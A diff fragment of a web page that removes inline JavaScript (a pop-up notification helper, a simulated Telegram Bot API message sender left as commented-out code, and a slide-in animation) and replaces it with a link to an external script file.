-                    <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle" style="margin-right: 10px;"></i>
-                    <div>${message}</div>
-                </div>
-            `;
-            
-            document.body.appendChild(notification);
-            
-            // Remove notification after 3 seconds
-            setTimeout(() => {
-                notification.remove();
-            }, 3000);
-        }
-
-        // Send Telegram message
-        function sendTelegramMessage(message) {
-            // In a real app, this would be done on the server to keep the token secure
-            // For demo purposes, we'll simulate the API call
-            console.log('Telegram message:', message);
-            
-            // This is just a simulation - in a real app, you would use:
-            // fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-            //     method: 'POST',
-            //     headers: {
-            //         'Content-Type': 'application/json',
-            //     },
-            //     body: JSON.stringify({
-            //         chat_id: telegramChatId,
-            //         text: message
-            //     })
-            // });
-        }
-
-        // Add slideInRight animation
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes slideInRight {
-                from {
-                    opacity: 0;
-                    transform: translateX(100%);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateX(0);
-                }
-            }
-        `;
-        document.head.appendChild(style);
-    </script>
+    <script src="script.js"></script>
 </body>
 </html>
